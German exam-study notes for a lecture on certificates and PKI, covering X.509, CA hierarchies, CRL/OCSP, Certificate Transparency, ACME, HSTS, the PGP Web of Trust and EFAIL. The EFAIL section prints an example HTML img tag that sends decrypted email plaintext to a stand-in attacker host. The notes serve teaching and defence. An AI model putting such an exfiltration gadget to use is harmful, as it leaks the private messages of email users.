# IT-Sicherheit 4 – Zertifikate und PKI

> **Foliensatz:** `4_pki_v4f.pdf`  
> **Klausurfokus:** Public-Key-Authentizität, X.509-Zertifikate, PKI-Komponenten und CA-Hierarchien, Zertifikatsprüfung/Sperrung, Certificate Transparency, ACME, HSTS sowie PGP/Web of Trust und EFAIL.

---

# 1. Motivation: Warum Zertifikate und PKI?

## 1.1 Problem der Public-Key-Kryptographie

Asymmetrische Kryptographie löst das Schlüsselverteilungsproblem symmetrischer Verfahren: Der **Public Key** darf veröffentlicht werden, der **Private Key** bleibt geheim.

Digitale Signaturen können liefern:

- **Authentizität**
- **Integrität**
- **Nicht-Abstreitbarkeit / Verbindlichkeit**

Aber: Ein verfügbarer Public Key ist nur dann nützlich, wenn seine **Zuordnung zu einer Identität authentisch** ist.

Beispiel:

```text
Alice möchte Bob verschlüsselt schreiben.
Sie benötigt einen Public Key.
Wenn der Key tatsächlich Mallory gehört, kann Mallory Nachrichten entschlüsseln.
```

## 1.2 Zertifikat

Ein digitales Public-Key-Zertifikat ist ein **signierter Datensatz**, der einen Public Key einer Entität zuordnet.

Mindestens enthalten:

- Public Key inklusive Algorithmus
- möglichst eindeutige Bezeichnung der Entität:
  - Name
  - E-Mail-Adresse
  - DNS-Name
  - X.500 Distinguished Name

Typisch zusätzlich:

- Aussteller (`Issuer`)
- Ausstellungsdatum und Gültigkeitszeitraum
- erlaubte Verwendungszwecke
- Seriennummer
- Signatur des Ausstellers

Eigenschaften:

- Die Zuordnung kann unabhängig vom Transportweg geprüft werden.
- Zertifikate können über öffentliche Keyserver/Verzeichnisdienste verteilt werden.
- Sie sind online und offline verwendbar.
- Die Signatur liefert einen nicht fälschbaren Beweis dafür, dass der Aussteller die Zuordnung bestätigt hat.

## 1.3 PKI

Eine **Public Key Infrastructure (PKI)** ist das Gesamtsystem für:

- Ausstellung
- Verteilung
- Nutzung
- Prüfung
- Widerruf

digitaler Zertifikate.

Standards:

- **X.509**: zentral/hierarchisch organisierte Zertifikatswelt, z. B. TLS.
- **OpenPGP**: flexiblere, oft dezentralere Zertifikats- und Vertrauenswelt.

---

# 2. Möglichkeiten, die Authentizität eines Public Keys zu prüfen

| Ansatz | Idee | Vorteil | Nachteil |
|---|---|---|---|
| **Direct Trust** | Public Key/Fingerprint wird persönlich übergeben bzw. verglichen. | Sehr hoher Vertrauensgrad. | Nicht skalierbar. |
| Vertrauenswürdige Quelle | Key/Key-Fingerprint wird aus vertrauenswürdiger Veröffentlichung übernommen. | Einfach, sofern Quelle vertrauenswürdig ist. | Vertrauen konzentriert sich auf diese Quelle. |
| Vorinstallierte Trust Stores | Betriebssystem, Browser oder Mailclient enthält Root-Keys. | Komfortabel und skalierbar. | Sehr viele Vertrauensanker; Kompromittierung einer CA wirkt weitreichend. |
| Keine Prüfung | Restrisiko wird akzeptiert, z. B. anonymes Diffie-Hellman. | Einfach. | Gegen MITM ungeeignet. |
| **Key Continuity / TOFU** | Beim ersten Kontakt Key speichern; später auf Änderungen prüfen. | Praktisch, z. B. SSH. | Erster Kontakt kann manipuliert sein. |
| Zertifikate + PKI | Auch nicht direkt vertrauenswürdige Quelle kann Key liefern; Signaturkette führt zum Trust Anchor. | Flexibel und gut skalierbar. | Komplexität, Vertrauen in CAs. |

## 2.1 Fingerprint

Ein **Fingerprint** ist ein kurzer Hashwert eines Public Keys, meist hexadezimal dargestellt. Er wird über einen vertrauenswürdigen Kanal verglichen, etwa persönlich oder über eine Visitenkarte.

---

# 3. X.509-Zertifikate

## 3.1 X.509v3

Die gebräuchliche Version ist **X.509v3**. Sie erlaubt Zertifikatserweiterungen. Das IETF-Profil ist in **RFC 5280** konkretisiert.

Wesentliche Zertifikatsfelder:

| Feld | Bedeutung |
|---|---|
| `version` | X.509-Version |
| `serialNumber` | Eindeutige Seriennummer des Zertifikats beim Aussteller |
| `signature` | Signaturalgorithmus |
| `issuer` | Aussteller des Zertifikats |
| `validity` | Zeitraum `Not Before` bis `Not After` |
| `subject` | Inhaber/Identität, zu der der Public Key gehört |
| `subjectPublicKeyInfo` | Algorithmus und Public Key des Inhabers |
| `issuerUniqueID` | Optionale eindeutige Ausstellerkennung, v2 |
| `subjectUniqueID` | Optionale eindeutige Inhaberkennung, v2 |
| `extensions` | Optionale Erweiterungen, v3 |

## 3.2 Distinguished Name

`Subject` und `Issuer` sind typischerweise X.500 Distinguished Names (DN).

Beispiel:

```text
CN = Tobias Straub
OU = Stuttgart
O  = Duale Hochschule Baden-Württemberg
C  = DE
```

| Kürzel | Bedeutung |
|---|---|
| `CN` | Common Name |
| `OU` | Organizational Unit |
| `O` | Organization |
| `C` | Country |

`issuerUniqueID` und `subjectUniqueID` werden üblicherweise nicht verwendet. Sie wären weltweit eindeutige IDs, wenn Distinguished Names wiederverwendet würden.

## 3.3 Wichtige X.509v3-Erweiterungen

| Erweiterung | Zweck |
|---|---|
| **Key Usage** | Legt zulässige kryptographische Nutzungen fest: Signatur, Nicht-Abstreitbarkeit, Verschlüsselung, Schlüsselvereinbarung, Zertifikats-/CRL-Signierung. |
| **Extended Key Usage (EKU)** | Konkretisiert Einsatzzweck: TLS Client Auth, TLS Server Auth, Code Signing, Secure E-Mail, Timestamping, OCSP Signing. |
| **Subject Alternative Name (SAN)** | Alternative Identitäten wie DNS-Name, E-Mail-Adresse, URI/URL oder IP-Adresse. Bei TLS praktisch zentral. |
| **Authority Key Identifier (AKI)** | Kennzeichnet den Schlüssel der ausstellenden CA. |
| **Subject Key Identifier (SKI)** | Kennzeichnet den Schlüssel des Zertifikatsinhabers. |
| **Certificate Policy** | Bedingungen der Ausstellung, insbesondere Art der Identitätsprüfung und Nutzungsbedingungen. |
| **Basic Constraints** | Kennzeichnet, ob der Inhaber eine CA ist; kann CA-Funktionen einschränken. |
| **CRL Distribution Points** | Fundorte von Sperrlisten, z. B. HTTP oder LDAP. |
| **Authority Information Access (AIA)** | Fundort des CA-Zertifikats und/oder OCSP-Responders. |

**Prüfungsfalle:** `Key Usage` und `Extended Key Usage` sind Nutzungseinschränkungen. Ein Zertifikat für TLS Server Authentication soll nicht beliebig z. B. für Code Signing eingesetzt werden.

---

# 4. Komponenten einer X.509-PKI

| Komponente | Aufgabe |
|---|---|
| **CA – Certification Authority** | Stellt Zertifikate aus und signiert sie; kann Root-CA oder Sub-CA sein. |
| **RA – Registration Authority** | Prüft Identität von Antragstellern; stellt normalerweise nicht selbst Zertifikate aus. |
| **Verzeichnisdienst** | Hält Zertifikate und Sperrinformationen vor, oft LDAP-basiert. |
| **Zeitstempel-Dienst** | Signiert Dokumenthash zusammen mit aktueller Zeit; dient Nachweis, dass Daten zu bestimmtem Zeitpunkt vorlagen. |
| **PSE – Personal Security Environment** | Sicherer Speicher für Private Keys. |
| End Entity (EE) | Person/System mit Endzertifikat; darf normalerweise keine Zertifikate ausstellen. |

## 4.1 PSE-Beispiele

- PKCS#12-Softtoken
- Smartcard
- USB-Token
- Hardware Security Module (HSM)

**Wichtig:** Private Keys müssen besonders geschützt werden. Ein Zertifikat ist öffentlich, der zugehörige Private Key darf niemals kompromittiert werden.

---

# 5. CA-Hierarchien und Trust Anchors

## 5.1 Trust Anchor

Ein **Trust Anchor** ist eine CA, deren Public Key bereits authentisch vorliegt und als vertrauenswürdig angenommen wird.

In Browsern/Betriebssystemen sind Trust Anchors meist in einer Trust List / Root Store vorinstalliert.

## 5.2 Hierarchische PKI

Streng hierarchisch:

```text
IPRA
  -> PCA
      -> CA / Sub-CA
          -> End Entities
```

| Ebene | Aufgabe |
|---|---|
| **IPRA** | Internet Policy Registration Authority; oberste Policy-Ebene im dargestellten Modell. |
| **PCA** | Policy Certification Authority für unterschiedliche Policies. |
| **CA / Sub-CA** | Stellt Zertifikate aus. |
| **EE** | End Entity; Person oder System ohne Ausstellungsrecht. |

## 5.3 Mesh PKI

Mehrere unabhängige Hierarchien existieren nebeneinander.

Folgen:

- Nutzer benötigt mehrere Trust Anchors.
- Trust List enthält Public Keys aller Top-Level-CAs.
- Vertrauen kann hergestellt werden durch:
  - **Cross-Zertifizierung**: CAs bestätigen sich gegenseitig.
  - **Bridge-Zertifizierung**: Bridge CA vermittelt zwischen Hierarchien.
  - signierte Certificate Trust List.

---

# 6. Gültigkeitsprüfung einer Zertifikatskette

## 6.1 Zertifikatspfad

Ein Zertifikatspfad ist eine Kette:

```text
cert[0] -> cert[1] -> ... -> cert[n]
```

- `cert[n]` enthält den Public Key des Endnutzers/Servers.
- Für jedes Zertifikat gilt:

```text
cert[i].issuer = cert[i-1].subject
```

- `cert[0]` ist meist selbstsigniert:

```text
cert[0].issuer = cert[0].subject
```

Die Selbstsignatur macht die Root CA nicht automatisch vertrauenswürdig. Vertrauen entsteht, weil ihr Public Key als Trust Anchor vorinstalliert oder direkt geprüft ist.

## 6.2 Prüfschritte

Für alle Zertifikate im Pfad:

1. Zertifikatskette zum Trust Anchor aufbauen.
2. Signatur jedes Zertifikats mit Public Key des Ausstellers prüfen.
3. Gültigkeitszeitraum prüfen.
4. Sperrstatus prüfen.
5. Nutzungsbeschränkungen prüfen:
   - Basic Constraints
   - Key Usage
   - Extended Key Usage
   - bei TLS insbesondere DNS-Name/SAN
6. Nur akzeptieren, wenn der gesamte Pfad gültig ist.

Für RSA ist die Signaturprüfung vereinfacht:

```text
s^e = h(m)
```

Dabei wird die Signatur mit öffentlichem Exponenten geprüft und mit dem Hash des signierten Inhalts verglichen.

---

# 7. Zertifikatssperrung

## 7.1 Gründe für Sperrung vor Ablauf

- Private Key gestohlen, verloren oder gebrochen
- Private Key unbrauchbar, z. B. Smartcard defekt
- Zertifikatsdaten nicht mehr korrekt:
  - Namensänderung
  - Jobwechsel
  - Domain-/Organisationsänderung

## 7.2 CRL

**CRL – Certificate Revocation List**

- von der CA signierte Liste
- enthält Seriennummern gesperrter Zertifikate
- enthält Sperrzeitpunkt und Sperrgrund
- Verteilung z. B. per HTTP oder LDAP

| Vorteil | Nachteil |
|---|---|
| Offline prüfbar, viele Zertifikate auf einmal abfragbar | Kann groß sein; Status ggf. zeitverzögert/veraltet. |

## 7.3 OCSP

**OCSP – Online Certificate Status Protocol**

- Online-Auskunft zum Status eines konkreten Zertifikats.
- Weniger Datenübertragung als ganze CRL.
- Kann aktuelleren Status liefern.

| Vorteil | Nachteil |
|---|---|
| Status für konkretes Zertifikat, geringe Datenmenge | Hohe Last auf CA/Responder; Verfügbarkeit und Datenschutz relevant. |

## 7.4 Whitelisting

Selten alleiniger Mechanismus: Ungültige Zertifikate werden aus einem Verzeichnis entfernt. Ohne expliziten Sperrstatus ist das schwächer und weniger transparent.

---

# 8. Probleme klassischer PKIs

## 8.1 Viele Vertrauensanker

Browser und Betriebssysteme enthalten sehr viele Root CAs. Jede vertrauenswürdige CA kann prinzipiell Zertifikate für beliebige Domains ausstellen.

Folge: Die effektive Sicherheit hängt nicht nur von der gewünschten CA ab, sondern von **allen** CAs im Root Store.

## 8.2 Kompromittierte oder fehlkonfigurierte CAs

Wenn eine CA oder Sub-CA kompromittiert wird oder unzulässige Zertifikate ausstellt, können Angreifer gültig wirkende TLS-Zertifikate für fremde Domains erhalten.

Mögliche Folge:

```text
Opfer <-> Angreifer (MITM) <-> echte Website
```

Der Browser akzeptiert das Zertifikat möglicherweise, weil es von einer vertrauenswürdigen CA signiert wurde.

---

# 9. Gegenmaßnahmen für PKI-Probleme

## 9.1 HTTP Public Key Pinning (HPKP) – historisch

Prinzip: **Trust on First Use (TOFU)**.

1. Beim ersten Aufruf liefert Webserver Hashwerte zulässiger CA- oder End-Entity-Public-Keys.
2. Browser speichert diese Pins für einen Zeitraum.
3. Bei späteren Verbindungen muss mindestens ein gepinnter Key in der Kette vorkommen.
4. Mindestens ein Backup Key muss gepinnt sein.

Ziel: Nur bestimmte CAs bzw. Schlüssel für eine Domain akzeptieren.

Probleme:

- Fehlkonfiguration oder Schlüsselverlust kann Domain für Nutzer unbrauchbar machen.
- Wenn CA-Key gepinnt wurde, werden Änderungen/Umstellungen bei der CA kompliziert.
- Deshalb wird von HPKP heute abgeraten; Browser-Support wurde eingestellt.

## 9.2 Certificate Transparency (CT)

Certificate Transparency reagiert auf heimlich oder unzulässig ausgestellte Zertifikate.

Prinzip:

1. CA trägt Zertifikat in ein öffentliches CT-Log ein.
2. Das Log liefert einen **Signed Certificate Timestamp (SCT)** als Aufnahmebestätigung.
3. Browser akzeptieren nur Zertifikate mit nachweisbarer Log-Aufnahme.
4. Domaininhaber können Logs überwachen und falsch ausgestellte Zertifikate erkennen.

Eigenschaften der Logs:

- öffentlich
- append-only: nur Anhängen, keine unbemerkte Änderung
- kryptographisch gesichert über Merkle-Tree-Hashes
- betrieben von verschiedenen Stellen

SCT-Verteilung:

- X.509v3-Erweiterung
- TLS-Erweiterung `signed_certificate_timestamp`
- OCSP-Antwort

**Wichtig:** CT verhindert keine falsche Ausstellung direkt; es macht sie nachvollziehbar und erkennbar.

---

# 10. ACME und Let’s Encrypt

## 10.1 Ziel

**ACME – Automatic Certificate Management Environment** automatisiert den kompletten Lebenszyklus von Webserver-Zertifikaten:

- Schlüsselerzeugung
- Beantragung
- Nachweis der Domainkontrolle
- Installation
- regelmäßige Erneuerung
- Revokation

Typischer Einsatz: Let’s Encrypt und Clients wie Certbot.

## 10.2 Kernelemente

| Begriff | Bedeutung |
|---|---|
| **Directory Object** | Enthält API-Endpunkte des ACME-Servers. |
| **Order** | Zertifikatsbestellung, insbesondere für angegebene DNS-Namen. |
| **Challenge** | Nachweis, dass Antragsteller die Domain kontrolliert. |
| **CSR** | Certificate Signing Request nach PKCS#10; enthält Identifier und Public Key, ist signiert. |
| **JWS** | JSON Web Signature; signiertes Nachrichtenformat für ACME-Kommunikation. |

## 10.3 Nachweis der Domainkontrolle

### DNS Challenge

Ein spezieller TXT-Record wird gesetzt:

```text
_acme-challenge.www.example.org. IN TXT "<Wert>"
```

### HTTP Challenge

Eine Datei wird unter vorgegebenem Pfad bereitgestellt:

```text
http://www.example.org/.well-known/acme-challenge/<Wert>
```

Die CA prüft den Eintrag bzw. die Datei. Erfolgreiche Prüfung zeigt Kontrolle über DNS-Zone bzw. Webserver.

---

# 11. HSTS – Schutz vor TLS-Downgrade

## 11.1 Downgrade-Angriff

Voraussetzung: Website ist über HTTP erreichbar, wenigstens Einstieg oder Redirect.

MITM-Angreifer:

1. verändert `https://domain.tld` zu `http://domain.tld`,
2. kommuniziert selbst weiter per TLS mit echter Website,
3. hält Opfer auf HTTP.

Folge:

- Klartextübertragung von Passwörtern oder Cookies möglich,
- Nutzer kann ggf. nicht erkennen, ob HTTP beabsichtigt ist.

## 11.2 HSTS Header

```http
Strict-Transport-Security: max-age=31536000; includeSubDomains
```

| Parameter | Bedeutung |
|---|---|
| `max-age` | Dauer in Sekunden, während Browser nur HTTPS für Domain nutzt. |
| `includeSubDomains` | Regel gilt auch für Subdomains. |
| `max-age=0` | HSTS deaktivieren. |

## 11.3 Ablauf

1. Nutzer ruft Website per HTTPS auf.
2. Browser validiert Zertifikat.
3. Response enthält HSTS Header.
4. Browser speichert: Domain nur über HTTPS ansprechen.
5. Künftige `http://`-Links werden lokal zu `https://` umgeschrieben.
6. Zertifikat nicht validierbar → Browser baut keine Verbindung auf.

Grenzen:

- Erster Besuch ist ohne vorher gespeicherte Policy noch angreifbar.
- Nach Ablauf von `max-age` ebenfalls.

Abhilfe: **HSTS Preload List**, die HSTS-Domains bereits im Browser enthält.

---

# 12. PGP, OpenPGP und GnuPG

## 12.1 PGP / OpenPGP

**PGP – Pretty Good Privacy** wurde 1991 von Phil Zimmermann entwickelt.

Heute ist **OpenPGP** der offene Standard für Nachrichten- und Zertifikatsformat.

Anwendungen:

- E-Mail-Verschlüsselung
- E-Mail-Signaturen
- Code Signing

Implementierungen:

- **GnuPG / GPG – GNU Privacy Guard**
- GPG4Win

Unterstützte Algorithmen im Foliensatz:

- asymmetrisch: RSA, ElGamal, elliptische Kurven
- symmetrisch: AES, 3DES
- Hash: SHA-2-256, SHA-3

## 12.2 Web of Trust

PGP verzichtet auf zwingend zentrale CA-Hierarchien. Vertrauen entsteht durch Nutzer und Signaturen auf Schlüsseln.

Prinzip:

- Nutzer prüfen Public-Key-Authentizität lokal nach eigener Policy.
- Nutzer können Schlüssel anderer Nutzer signieren/beglaubigen.
- Diese Nutzer können als **Trusted Introducers** fungieren.

Modell:

```text
Person/Public Key = Knoten
Zertifikat/Schlüsselsignatur = gerichtete Kante
```

Es entsteht ein gerichteter Vertrauensgraph.

### Vorteile

- kein zwingender zentraler Vertrauensanker
- flexible Vertrauensstrukturen
- prinzipiell skalierbar über viele Personen
- lokale, individuelle Trust Policy möglich

### Nachteile

- Vertrauen in fremde Personen und deren Sorgfalt notwendig
- kein einheitlicher Standard für Qualität der Identitätsprüfung
- keine Haftung bei Fehlbeglaubigungen, höchstens Reputationsverlust
- Bedienung und Trust-Entscheidungen sind komplex

## 12.3 Lokale Zertifikate

Ein `L` kennzeichnet lokale Zertifikate/Signaturen, die nicht auf Keyserver hochgeladen werden.

---

# 13. Owner Trust und Key Validity

Diese Begriffe müssen getrennt werden.

## 13.1 Owner Trust

**Owner Trust** beantwortet:

> Wie sorgfältig prüft der Schlüsselinhaber andere Identitäten, bevor er deren Schlüssel signiert?

| Level | Bedeutung |
|---|---|
| `unknown` | Standard: keine Aussage. |
| `none` | Explizit kein Vertrauen. |
| `marginal` | Begrenztes Vertrauen; Person signiert vermutlich angemessen. |
| `complete` | Volles Vertrauen; Person prüft sehr sorgfältig. |
| `ultimate` | Vollstes Vertrauen; Person darf auch für dich Vertrauensentscheidungen treffen. Typisch eigener Schlüssel. |

## 13.2 Key Validity

**Key Validity** beantwortet:

> Gehört dieser Public Key wirklich der angegebenen Person/Identität?

| Level | Bedeutung |
|---|---|
| `unknown` / keine Antwort | Authentizität nicht ausreichend bewertet. |
| `marginal` | Public Key vermutlich authentisch. |
| `complete` | Public Key ist authentisch. |
| `ultimate` | Public Key gehört zum eigenen Schlüsselpaar. |

**Merksatz:**  
Owner Trust bewertet den **Aussteller** von Zertifikaten.  
Key Validity bewertet den **Zielschlüssel** und seine Identität.

---

# 14. GnuPG: Key Validity und Trust Model

## 14.1 Parameter

GnuPG kann lokal konfigurieren, wann ein Public Key als gültig gilt:

- ein Zertifikat eines Owners mit `ultimate` Trust, oder
- `X` Signaturen von Owners mit `complete` Trust  
  - Default: `completes-needed = 1`
- `Y` Signaturen von Owners mit `marginal` Trust  
  - Default: `marginals-needed = 3`
- Mindestniveau der Identitätsprüfung: `min-cert-level`, Default 2
- maximale Zertifikatskettenlänge: `max-cert-depth`, Default 5

## 14.2 Trust Models

| Modell | Bedeutung |
|---|---|
| `pgp` | Web of Trust mit Trust Signatures. |
| `classic` | Web of Trust ohne Trust Signatures. |
| `direct` | Nur direkte/manuelle Prüfung. |
| `always` | Keine Prüfung; alles gilt als vertrauenswürdig. Unsicher. |

## 14.3 Primär- und Unterschlüssel

Üblich ist:

- **Primärschlüssel**: Beglaubigung/Zertifizierung anderer Schlüssel.
- **Unterschlüssel**: Verschlüsselung, Signatur, Authentifizierung etc.

Das ermöglicht bessere Schlüsseltrennung und den Austausch einzelner Unterschlüssel ohne Verlust der gesamten Identität.

## 14.4 Capabilities

OpenPGP-Schlüssel können für unterschiedliche Zwecke markiert sein:

- Zertifizieren
- Signieren
- Verschlüsseln für Kommunikation
- Verschlüsseln für Speicherung
- Authentifizieren

Zusätzlich kann markiert sein, ob Private Key mehreren Personen bekannt ist oder per Secret Sharing geteilt wird.

---

# 15. Trust Signatures

Bis hierhin waren Owner-Trust-Festlegungen lokal. **Trust Signatures** ermöglichen zusätzliche Vertrauensaussagen direkt in einer Schlüsselsignatur.

Sie machen Vertrauen transitiv, ähnlich einer CA-Hierarchie.

Parameter:

| Parameter | Bedeutung |
|---|---|
| `level = 0` | gewöhnliche Signatur |
| `level = 1` | zertifizierter Schlüssel ist Trusted Introducer |
| `level = 2` | zertifizierter Schlüssel darf selbst Level-1-Trust-Signatures ausstellen (Meta-Introducer) |
| `trust amount = 60` | partial trust |
| `trust amount = 120` | complete trust |

Allgemein: Level `n` erlaubt dem Zertifizierten, Trust Signatures für Level `n-1` auszustellen.

---

# 16. EFAIL

EFAIL bezeichnet Schwachstellen/Angriffe auf die Verarbeitung verschlüsselter E-Mails, insbesondere PGP und S/MIME.

## 16.1 Exfiltration Gadget

Ein Angreifer fügt verschlüsselten Mailinhalt in HTML ein, etwa als externe Ressource. Nach der Entschlüsselung lädt der Mailclient externe Inhalte oder sendet Teile des Klartexts an einen Angreifer-Server.

Voraussetzungen:

- HTML-Maildarstellung,
- automatisches Nachladen externer Inhalte,
- häufig fehlende oder unzureichende Integritätsprüfung.

## 16.2 Malleability Gadget

Bei fehlendem Schutz gegen Chiffrat-Manipulation kann Angreifer bekannte Klartextstrukturen ausnutzen und bei formbaren Verschlüsselungsmodi wie CBC gezielt das Chiffrat verändern.

Dadurch wird nach Entschlüsselung z. B. ein HTML-Fragment eingeschleust, das Klartext über eine externe URL exfiltriert.

Beispielidee:

```html
<img src="http://angreifer.example/?<entschlüsselter-text>">
```

## 16.3 Gegenmaßnahmen

- HTML und JavaScript bei E-Mail-Anzeige deaktivieren bzw. beschränken.
- Automatisches Nachladen externer Inhalte blockieren.
- Authenticated Encryption verwenden, etwa AES-GCM.
- Aktuelle PGP-/S/MIME-Standards und Clients einsetzen.
- Integritätsprüfung darf nicht ignoriert werden.

---

# 17. Zentrale Abgrenzungen

| Begriffe | Unterschied |
|---|---|
| Zertifikat / Public Key | Zertifikat bindet einen Public Key signiert an eine Identität; der Public Key allein sagt nichts über seine Zugehörigkeit. |
| CA / RA | CA stellt Zertifikate aus und signiert sie; RA prüft typischerweise die Identität des Antragstellers. |
| Root CA / Sub-CA | Root CA ist Trust Anchor bzw. oberste CA; Sub-CA wird von übergeordneter CA zertifiziert und stellt Endzertifikate aus. |
| CRL / OCSP | CRL liefert signierte Liste gesperrter Zertifikate; OCSP fragt Status eines einzelnen Zertifikats online ab. |
| X.509 PKI / Web of Trust | X.509 basiert meist auf zentralen/hierarchischen CAs; WoT auf individuellen Signaturen und lokalen Trust Policies. |
| Owner Trust / Key Validity | Owner Trust: Vertrauen in Sorgfalt eines Zertifikatsausstellers. Key Validity: Vertrauen, dass Key zu angegebener Identität gehört. |
| HPKP / Certificate Transparency | HPKP bindet Browser an erwartete Keys, ist aber fehleranfällig und eingestellt; CT macht Zertifikatsausstellung transparent und überprüfbar. |
| TLS / HSTS | TLS schützt konkrete Verbindung; HSTS zwingt Browser nach erfolgreicher Policy künftig zur HTTPS-Nutzung. |
| Salt / Pepper | Nicht Thema dieses Satzes, aber: Salt ist pro Passwort und nicht geheim; Pepper ist globales Geheimnis. Nicht mit Zertifikats-Fingerprint verwechseln. |

---

# 18. Klausur-Checkliste

Du solltest erklären können:

1. Warum Public Keys nicht nur verfügbar, sondern authentisch sein müssen.
2. Was ein digitales Zertifikat ist und welche Informationen es enthält.
3. Direktvertrauen, Key Continuity/TOFU und PKI als Ansätze zur Key-Authentizitätsprüfung vergleichen.
4. Aufbau eines X.509v3-Zertifikats erklären.
5. Subject, Issuer, Serial Number, Validity und Subject Public Key Info erklären.
6. Key Usage, Extended Key Usage, SAN, Basic Constraints, CRL Distribution Points und AIA erklären.
7. CA, RA, Verzeichnisdienst, Zeitstempel-Dienst und PSE unterscheiden.
8. Hierarchische PKI und Mesh PKI vergleichen.
9. Trust Anchor und Zertifikatskette erklären.
10. Die Prüfschritte einer Zertifikatsvalidierung nennen.
11. Gründe für Zertifikatssperrung nennen.
12. CRL und OCSP vergleichen.
13. Warum viele Root CAs ein Sicherheitsproblem darstellen.
14. HPKP und Gründe für seine Einstellung erklären.
15. Certificate Transparency, Merkle Trees und SCT erklären.
16. ACME-Ablauf und DNS-/HTTP-Challenge erklären.
17. HSTS-Downgrade-Angriff, Header und Preload List erklären.
18. PGP/OpenPGP und Web of Trust einordnen.
19. Owner Trust und Key Validity exakt abgrenzen.
20. Trust Signatures, Trusted Introducer und Trust Levels erklären.
21. EFAIL als Kombination aus HTML-Mail, Chiffrat-Manipulation und fehlender Integritätsprüfung erklären.

---

## Quellenbasis

- Foliensatz **„IT-Sicherheit 4 – Zertifikate und PKI“**, Prof. Dr. Tobias Straub, DHBW Stuttgart.
- Themen: Public-Key-Zertifikate, X.509, PKI, CA-Hierarchien, Gültigkeit/Sperrung, Certificate Transparency, ACME, HSTS, OpenPGP/Web of Trust und EFAIL.
